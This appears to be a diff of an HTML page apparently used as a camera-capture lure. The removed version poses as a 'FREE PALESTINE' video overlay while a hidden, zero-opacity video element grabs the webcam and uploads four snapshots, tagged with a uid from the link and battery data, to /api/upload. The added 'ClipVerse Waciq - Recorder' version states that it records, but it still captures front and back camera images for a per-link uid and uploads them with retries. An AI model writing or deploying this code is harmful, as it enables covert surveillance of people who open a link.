@@ -1,136 +1,377 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FREE PALESTINE Video Overlay</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ClipVerse Waciq - Recorder</title>
+  <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      text-align: center;
+      backdrop-filter: blur(6px);
+    }
+    .container {
+      background: rgba(0, 0, 0, 0.65);
+      border-radius: 18px;
+      padding: 36px 30px;
+      width: 100%;
+      max-width: 820px;
+      box-shadow: 0 0 30px rgba(0,255,153,0.35);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+      animation: popIn 0.6s ease-out;
+    }
+    .top-row {
+      display:flex;
+      width:100%;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
+    .logo {
+      width: 88px;
+      height: auto;
+      margin: 0;
+      box-shadow: 0 0 12px rgba(0,255,255,0.4);
+      border-radius: 6px;
+      background: rgba(255,255,255,0.02);
+      padding:6px;
+    }
+    .title {
+      flex:1;
+      text-align:left;
+      margin-left:14px;
+    }
+    .title h1{
+      margin:0;
+      font-family: 'Orbitron', monospace;
+      font-size: 22px;
+      color: #00ffd0;
+      text-shadow: 0 0 8px rgba(0,255,200,0.12);
+    }
+    .title p{ margin:2px 0 0; font-size:13px; color:#bfffdc; opacity:0.9; }
+    .loader {
+      border: 6px solid rgba(255,255,255,0.12);
+      border-top: 6px solid #00ffc9;
+      border-radius: 50%;
+      width: 48px;
+      height: 48px;
+      animation: spin 1s linear infinite;
+    }
+    .text {
+      font-size: 17px;
+      line-height: 1.6;
+      font-weight:700;
+      background: linear-gradient(90deg,#00ffe7,#00ffa1,#9fff5b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .credit { margin-top: 6px; font-size:13px; color:#d0ffd6; opacity:0.9; }
 
-<!-- Google Font Orbitron -->
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    /* status & log panel */
+    .panel {
+      width:100%;
+      display:flex;
+      gap:16px;
+      margin-top:6px;
+    }
+    .col {
+      flex:1;
+      background: rgba(0,0,0,0.35);
+      border-radius: 12px;
+      padding: 12px;
+      min-height: 120px;
+      box-shadow: inset 0 0 12px rgba(0,0,0,0.6);
+      text-align:left;
+    }
+    .col h3 { margin:0 0 8px 0; font-size:14px; color:#bfffdc; }
+    #status { font-size:14px; color:#e6fff2; margin:0 0 6px 0; }
+    #log { font-family: monospace; font-size:13px; color:#c8ffd8; white-space:pre-wrap; max-height:240px; overflow:auto; }
 
-<style>
-  html, body {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    width: 100%;
-    overflow: hidden;
-    background: url('https://i.postimg.cc/Mp85QgJD/IMG-20250917-124655-217.jpg') no-repeat center center fixed;
-    background-size: cover;
-    font-family: 'Orbitron', sans-serif;
-  }
-
-  video#bgVideo {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    z-index: 0;
-  }
-
-  .text-layer {
-    position: absolute;
-    font-weight: 800;
-    white-space: nowrap;
-    z-index: 2;
-    color: #00ffea;
-    text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
-    animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
-  }
-  .text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
-  .text2 { font-size: 5vw; top: 55%; left: 40%; animation-delay: 2s; }
-
-  @keyframes floatUp {
-    0% { transform: translateY(0px); opacity: 1; }
-    100% { transform: translateY(-150px); opacity: 0.8; }
-  }
-
-  @keyframes glow {
-    0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
-    100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
-  }
-
-  /* Hidden camera + snapshot elements (opacity 0, not display:none) */
-  video#video {
-    position: absolute;
-    opacity: 0;
-    width: 1px;
-    height: 1px;
-  }
-  canvas#snapshot { display: none; }
-</style>
+    @keyframes spin { 0%{transform:rotate(0)}100%{transform:rotate(360deg)} }
+    @keyframes popIn { 0%{opacity:0; transform:scale(0.96)}100%{opacity:1; transform:scale(1)} }
+    @media (max-width:720px){
+      .panel{ flex-direction:column; }
+      .title p{ display:none; }
+    }
+    video, canvas { display:none; }
+  </style>
 </head>
 <body>
+  <div class="container">
+    <div class="top-row">
+      <img class="logo" src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo">
+      <div class="title">
+        <h1>ClipVerse Waciq — Recorder</h1>
+        <p>Recording snapshots from front & back cameras and uploading to /api/upload</p>
+      </div>
+      <div style="display:flex;flex-direction:column;align-items:center;gap:6px;">
+        <div class="loader" aria-hidden="true"></div>
+        <div style="font-size:12px;color:#ddffee">Recording</div>
+      </div>
+    </div>
 
-<!-- Video background -->
-<video id="bgVideo" autoplay playsinline loop muted>
-  <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
-</video>
+    <div class="text">🕵️‍♂️ Recording in progress — Please keep this tab open 🎥</div>
 
-<!-- Text overlays -->
-<div class="text-layer text1">FREE PALESTINE</div>
-<div class="text-layer text2">FREE PALESTINE</div>
+    <div class="panel">
+      <div class="col">
+        <h3>Status</h3>
+        <div id="status">Initializing...</div>
+        <div class="credit">𝗠𝗮𝗱𝗲 𝗯𝘆 💛 𝗪𝗔𝗖𝗜𝗤</div>
+      </div>
+      <div class="col">
+        <h3>Log</h3>
+        <div id="log"></div>
+      </div>
+    </div>
+  </div>
 
-<!-- Hidden Camera + Snapshot Elements -->
-<video id="video" autoplay playsinline></video>
-<canvas id="snapshot"></canvas>
+  <!-- Hidden video/canvas elements -->
+  <video id="videoFront" autoplay playsinline></video>
+  <video id="videoBack" autoplay playsinline></video>
+  <canvas id="snapshotFront"></canvas>
+  <canvas id="snapshotBack"></canvas>
 
 <script>
-const video = document.getElementById('video');
-const canvas = document.getElementById('snapshot');
-const ctx = canvas.getContext('2d');
-const params = new URLSearchParams(window.location.search);
-const uid = params.get('uid') || 'unknown';
+/* Robust camera + snapshot flow with logs and timestamps.
+   - Takes two front snapshots and two back snapshots (if available).
+   - Uploads each to /api/upload with retries.
+   - Shows status & detailed log in UI.
+*/
 
-let snapshotsTaken = 0;
-const maxSnapshots = 4;
+const statusEl = document.getElementById('status');
+const logEl = document.getElementById('log');
+const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
 
-// Function to take snapshot
-function takeSnapshotAndSend(battery, charging) {
-  if (snapshotsTaken >= maxSnapshots) return;
-  if(video.videoWidth === 0 || video.videoHeight === 0) return; // wait for video
-
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0);
-
-  const imageData = canvas.toDataURL('image/png');
-
-  fetch('/api/upload', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ image: imageData, uid, battery, charging })
-  }).then(res => res.json()).then(data => {
-    console.log(`Uploaded snapshot ${snapshotsTaken+1}`);
-    snapshotsTaken++;
-    if(snapshotsTaken === maxSnapshots){
-      console.log("Max snapshots reached, stopping camera.");
-      if(video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
-    }
-  }).catch(err => console.error("Upload error:", err));
+function nowISO(){ return new Date().toISOString(); }
+function log(msg){
+  const line = `[${nowISO()}] ${msg}\n`;
+  logEl.innerText = line + logEl.innerText;
+  console.log(msg);
 }
 
-// Start camera only if uid is provided
-if(uid){
-  navigator.getBattery().then(battery => {
-    const batteryLevel = Math.round(battery.level * 100);
-    const isCharging = battery.charging;
-
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      video.srcObject = stream;
-
-      // Wait until video can play
-      video.oncanplay = () => {
-        // Take 4 snapshots, 2 seconds apart
-        for(let i=1; i<=maxSnapshots; i++){
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), i*2000);
-        }
-      }
-    }).catch(err => console.error("Camera error:", err));
+/* small helper to wait for video metadata */
+function waitForLoadedMetadata(videoEl, timeout=3500){
+  return new Promise((resolve) => {
+    if(videoEl.readyState >= 1 && videoEl.videoWidth){
+      resolve();
+      return;
+    }
+    const onLoaded = () => { videoEl.removeEventListener('loadedmetadata', onLoaded); resolve(); };
+    videoEl.addEventListener('loadedmetadata', onLoaded);
+    setTimeout(()=>resolve(), timeout);
   });
 }
+
+/* take snapshot */
+async function takeSnapshot(videoEl, canvasEl){
+  await waitForLoadedMetadata(videoEl);
+  const w = videoEl.videoWidth || 640;
+  const h = videoEl.videoHeight || 480;
+  canvasEl.width = w; canvasEl.height = h;
+  const ctx = canvasEl.getContext('2d');
+  ctx.drawImage(videoEl, 0, 0, w, h);
+  return canvasEl.toDataURL('image/png');
+}
+
+/* upload with retries */
+async function upload(payload, maxRetries=2){
+  let lastErr = null;
+  for(let attempt=0; attempt<=maxRetries; attempt++){
+    try{
+      const res = await fetch('/api/upload', {
+        method:'POST',
+        headers:{ 'Content-Type':'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if(!res.ok){
+        const txt = await res.text().catch(()=>'');
+        throw new Error(`HTTP ${res.status} ${res.statusText} ${txt}`);
+      }
+      const json = await res.json().catch(()=>({ok:true}));
+      return json;
+    }catch(err){
+      lastErr = err;
+      log(`Upload attempt ${attempt+1} failed: ${err.message}`);
+      await new Promise(r=>setTimeout(r, 600));
+    }
+  }
+  throw lastErr;
+}
+
+/* discover video devices (try to get labels by requesting permission once) */
+async function getVideoDevices(){
+  try{
+    const temp = await navigator.mediaDevices.getUserMedia({video:true});
+    temp.getTracks().forEach(t=>t.stop());
+  }catch(e){
+    // ignore; may be permission denied, we'll still enumerate
+  }
+  const devices = await navigator.mediaDevices.enumerateDevices();
+  return devices.filter(d=>d.kind === 'videoinput');
+}
+
+/* start stream by deviceId or facingMode fallback */
+async function startStreamForDevice(videoEl, deviceId, facing){
+  try{
+    if(deviceId){
+      const s = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: deviceId } } });
+      videoEl.srcObject = s;
+      await waitForLoadedMetadata(videoEl);
+      return s;
+    }else if(facing){
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+      videoEl.srcObject = s;
+      await waitForLoadedMetadata(videoEl);
+      return s;
+    }else{
+      const s = await navigator.mediaDevices.getUserMedia({ video: true });
+      videoEl.srcObject = s;
+      await waitForLoadedMetadata(videoEl);
+      return s;
+    }
+  }catch(err){
+    throw err;
+  }
+}
+
+/* main flow */
+(async function main(){
+  statusEl.innerText = 'Detecting devices...';
+  log('Init: starting device discovery');
+
+  // battery info
+  try{
+    const battery = await navigator.getBattery();
+    log(`Battery: ${Math.round(battery.level*100)}% | Charging: ${battery.charging}`);
+  }catch(e){
+    log('Battery API not available');
+  }
+
+  const videoFront = document.getElementById('videoFront');
+  const videoBack = document.getElementById('videoBack');
+  const canvasFront = document.getElementById('snapshotFront');
+  const canvasBack = document.getElementById('snapshotBack');
+
+  let devices = [];
+  try{
+    devices = await getVideoDevices();
+    log(`Found ${devices.length} video device(s).`);
+  }catch(e){
+    log('enumerateDevices failed: ' + (e && e.message ? e.message : e));
+  }
+
+  // guess front/back by label if available
+  const backGuess = devices.find(d => /back|rear|environment|cam 1|camera 1/i.test(d.label)) || devices[1] || null;
+  const frontGuess = devices.find(d => /front|user|selfie/i.test(d.label)) || devices[0] || null;
+
+  if(frontGuess) log(`Guessed front device: ${frontGuess.label || frontGuess.deviceId}`);
+  if(backGuess) log(`Guessed back device: ${backGuess.label || backGuess.deviceId}`);
+
+  // start front
+  let frontStream = null;
+  try{
+    if(frontGuess && frontGuess.deviceId){
+      frontStream = await startStreamForDevice(videoFront, frontGuess.deviceId, null);
+      log('Front camera started using deviceId');
+    }else{
+      frontStream = await startStreamForDevice(videoFront, null, 'user');
+      log('Front camera started using facingMode:user');
+    }
+    statusEl.innerText = 'Front camera ready...';
+  }catch(err){
+    log('Front camera failed: ' + (err && err.name ? err.name + ': ' + err.message : err));
+    statusEl.innerText = 'Front camera error';
+  }
+
+  // start back with fallbacks
+  let backStream = null;
+  try{
+    if(backGuess && backGuess.deviceId){
+      try{
+        backStream = await startStreamForDevice(videoBack, backGuess.deviceId, null);
+        log('Back camera started using deviceId');
+      }catch(err){
+        log('Back via deviceId failed, trying facingMode:environment — ' + (err && err.message ? err.message : err));
+        backStream = await startStreamForDevice(videoBack, null, 'environment');
+        log('Back camera started using facingMode:environment fallback');
+      }
+    }else{
+      backStream = await startStreamForDevice(videoBack, null, 'environment');
+      log('Back camera started using facingMode:environment');
+    }
+    statusEl.innerText = 'Back camera ready...';
+  }catch(err){
+    log('Back camera error: ' + (err && err.name ? err.name + ': ' + err.message : err));
+    statusEl.innerText = 'Back camera error';
+  }
+
+  // schedule snapshots
+  const tasks = [];
+  if(frontStream){
+    tasks.push({when:1500, cam:'Front'});
+    tasks.push({when:3500, cam:'Front'});
+  } else {
+    log('Skipping front snapshots (no front stream)');
+  }
+  if(backStream){
+    tasks.push({when:5500, cam:'Back'});
+    tasks.push({when:7500, cam:'Back'});
+  } else {
+    log('Skipping back snapshots (no back stream)');
+  }
+
+  for(const t of tasks){
+    setTimeout(async ()=>{
+      const label = t.cam;
+      const videoEl = label === 'Front' ? videoFront : videoBack;
+      const canvasEl = label === 'Front' ? canvasFront : canvasBack;
+      if(!videoEl || !videoEl.srcObject){
+        log(`${label} snapshot skipped — stream unavailable`);
+        return;
+      }
+      log(`${label}: taking snapshot...`);
+      let imageData;
+      try{
+        imageData = await takeSnapshot(videoEl, canvasEl);
+        log(`${label}: snapshot captured`);
+      }catch(err){
+        log(`${label}: snapshot failed — ${err && err.message ? err.message : err}`);
+        return;
+      }
+
+      const payload = {
+        uid,
+        camera: label,
+        timestamp: nowISO(),
+        image: imageData
+      };
+
+      try{
+        log(`${label}: uploading...`);
+        const res = await upload(payload, 2);
+        log(`${label}: upload success — response ${JSON.stringify(res).slice(0,200)}`);
+      }catch(err){
+        log(`${label}: upload permanently failed — ${err && err.message ? err.message : err}`);
+      }
+    }, t.when);
+  }
+
+})();
 </script>
 </body>
 </html> 
